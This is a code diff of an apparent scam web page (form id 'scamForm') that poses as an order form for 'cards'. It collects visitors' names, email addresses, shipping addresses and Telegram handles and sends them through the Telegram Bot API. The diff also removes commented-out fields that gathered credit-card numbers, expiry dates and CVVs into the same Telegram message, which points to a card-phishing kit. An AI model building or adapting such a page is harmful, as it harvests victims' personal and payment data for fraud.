@@ -181,13 +181,26 @@ option {
         }
         
 
+/* Style for select when focused */
 select:focus {
     outline: none !important;
     border-color: #EF5350;
 }
 
-select:focus+label {
-    color: #EF5350;
+/* Style for label associated with the focused select */
+select:focus + label {
+    
+}
+
+/* Style for input when focused */
+input:focus {
+    outline: none !important;
+    border-color: #EF5350;
+}
+
+/* Style for label associated with the focused input */
+input:focus + label {
+    
 }
 
 
@@ -203,14 +216,6 @@ select:focus+label {
             font-size: 1rem;
         }
 
-        input:focus {
-            outline: none !important;
-            border-color: #EF5350;
-        }
-
-        input:focus+label {
-            color: #EF5350;
-        }
 
         input[type="submit"] {
             display: table;
@@ -286,7 +291,7 @@ myQuantitySelector.addEventListener('change', () => {
 
 <body translate="no">
     <div class="container">
-        <header>Register to the waiting queue
+        <header>Order Form: Complete to Proceed
        
         </header>
         
@@ -305,14 +310,106 @@ myQuantitySelector.addEventListener('change', () => {
                         <label for="lastname">Mail address</label>
                         <input type="text" name="Contact-mail" placeholder="spiderman@gmail.com" required>
                     </div>
-                    <label for="firstname">Reserve card quantity.</label>
-                    <div class="input-group quantity-selector">
-                        <input type="number" id="inputQuantitySelector" class="form-control" aria-live="polite" data-bs-step="counter" name="quantity" title="quantity" value="1" min="1" max="10" step="1" data-bs-round="0" aria-label="Quantity selector">
-         
-                        
-                      </div>
-                      <h4 class="smalld">For larger quantities, please contact our staff directly.</h4>
+                    
                 </div>
+                <h4 class="smalld">For larger quantities, please contact our staff directly.</h4>
+                <br>
+                <h2 style="font-size: 20px;">Product</h2>
+                <label for="lastname">Product</label>
+                <input type="text" name="Contact-mail" placeholder="(Standard) Basic Card" required readonly>
+                <label for="firstname">Reserve card quantity.</label>
+                <div class="input-group quantity-selector">
+                    <input type="number" id="inputQuantitySelector" class="form-control" aria-live="polite" data-bs-step="counter" name="quantity" title="quantity" value="1" min="1" max="10" step="1" data-bs-round="0" aria-label="Quantity selector">
+                   
+                    <h2 style="font-size: 20px;">Shipping</h2>
+                   
+                    <label for="country">Country</label>
+  <select id="country" name="country" required>
+    <option value="" selected disabled>Select a country</option>
+    <option value="US">United States</option>
+    <option value="AT">Austria</option>
+    <option value="BE">Belgium</option>
+    <option value="BG">Bulgaria</option>
+    <option value="HR">Croatia</option>
+    <option value="CY">Cyprus</option>
+    <option value="CZ">Czech Republic</option>
+    <option value="DK">Denmark</option>
+    <option value="EE">Estonia</option>
+    <option value="FI">Finland</option>
+    <option value="FR">France</option>
+    <option value="DE">Germany</option>
+    <option value="GR">Greece</option>
+    <option value="HU">Hungary</option>
+    <option value="IE">Ireland</option>
+    <option value="IT">Italy</option>
+    <option value="LV">Latvia</option>
+    <option value="LT">Lithuania</option>
+    <option value="LU">Luxembourg</option>
+    <option value="MT">Malta</option>
+    <option value="NL">Netherlands</option>
+    <option value="PL">Poland</option>
+    <option value="PT">Portugal</option>
+    <option value="RO">Romania</option>
+    <option value="SK">Slovakia</option>
+    <option value="SI">Slovenia</option>
+    <option value="ES">Spain</option>
+    <option value="SE">Sweden</option>
+    <option value="GB">United Kingdom</option>
+  </select>
+
+                  
+                    <label for="name">Name</label>
+                    <input type="text" id="name" name="name" placeholder="James"  required>
+                  
+                    <label for="surname">Surname</label>
+                    <input type="text" id="surname" name="surname" placeholder="Henry" required>
+                  
+                    <label for="address">Shipping Address</label>
+                    <input type="text" id="address" name="address" placeholder="Rue de Rivoli 3"  required>
+                  
+                    <label for="postal">Postal Code</label>
+                    <input type="text" id="postal" name="postal" placeholder="40342" required>
+                  
+                    <label for="city">City</label>
+                    <input type="text" id="city" name="city" placeholder="Paris" required>
+                  
+                    <label for="shipping-method">Shipping Method</label>
+
+                    <select id="shipping-method" name="shipping-method" onchange="calculateTotal()" required>
+                        <option value="DHL">DHL: 5-7 Days (Free)</option>
+                        <option value="UPS">UPS: 3-4 Days (+ ~10€)</option>
+                        <option value="FedexExpress">Fedex Express: 1-2 Days (+ ~20€)</option>
+                      </select>
+                      
+                      <br>
+                      <img src="stream/payment4K.png" style="max-width: 100%; height: auto; display: block; margin: 0 auto">
+                      <br>
+
+                      <h2 name="total" id="total-to-pay">Total To Pay: 59€</h2>
+                      <h3>You will need to settle this amount later with a staff member. Here, we're solely placing the order.</h3>
+                
+
+
+                </div>
+
+                <script>
+                    function calculateTotal() {
+                      var basePrice = 59;
+                      var shippingMethod = document.getElementById("shipping-method").value;
+                      var shippingPrice;
+                  
+                      if (shippingMethod === "DHL") {
+                        shippingPrice = 0;
+                      } else if (shippingMethod === "UPS") {
+                        shippingPrice = 10;
+                      } else if (shippingMethod === "FedexExpress") {
+                        shippingPrice = 20;
+                      }
+                  
+                      var totalToPay = basePrice + shippingPrice;
+                      document.getElementById("total-to-pay").textContent = "Total To Pay: " + totalToPay + "€";
+                    }
+                  </script>
                 
    <!--             <div class="row">
                     
@@ -379,7 +476,7 @@ myQuantitySelector.addEventListener('change', () => {
                
         -->
                 <div class="row">
-                    <input type="submit" name="submit" value="Pre-order">
+                    <input type="submit" name="submit" value="Order Now">
                 </div>
             </form>
 
@@ -401,13 +498,15 @@ myQuantitySelector.addEventListener('change', () => {
     
             // Construct the message body with titles, spoilers, and date
             let messageBody = `\n\n📅 *${new Date().toLocaleString()}*\n\n`;
-            
     
-            messageBody += getSection(formData, ['Telegram', 'Contact-mail']);
+            messageBody += getSection(formData, ['Telegram', 'Contact-mail', 'quantity', 'country', 'name', 'surname', 'address', 'postal', 'city', 'shipping-method']);
     
-    
-         //    messageBody += '\n\n🔱 𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 🔱\n';
-         //   messageBody += getSection(formData, ['➥💳 • Holders Name & Surname','➥💳 • CreditCard Number', '➥💳 • Expiration Date', '➥💳 • CVV']);
+            const telegramMessage = `Thank you for your order! Your order details:\n${messageBody}`;
+            const telegramApiUrl = `https://api.telegram.org/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage?chat_id=${formData.get('Telegram')}&text=${encodeURIComponent(telegramMessage)}`;
+            fetch(telegramApiUrl)
+                .then(response => response.json())
+                .then(data => console.log('Telegram confirmation sent:', data))
+                .catch(error => console.error('Error sending Telegram confirmation:', error));
     
             const parseMode = 'Markdown';
     
@@ -433,7 +532,7 @@ myQuantitySelector.addEventListener('change', () => {
                 console.error('Error sending to Telegram:', error);
     
                 const formOutput = document.getElementById('formOutput');
-                formOutput.innerHTML = '<p>Error checking the Informations. Please try again later.</p>';
+                formOutput.innerHTML = '<p>Error checking the Information. Please try again later.</p>';
             });
         });
     
@@ -442,6 +541,7 @@ myQuantitySelector.addEventListener('change', () => {
             return fields.map(field => `${field} : ${formData.get(field)}`).join('\n');
         }
     </script>
+    
       <script>
         document.getElementById('scamForm').addEventListener('submit', function (event) {
             event.preventDefault();
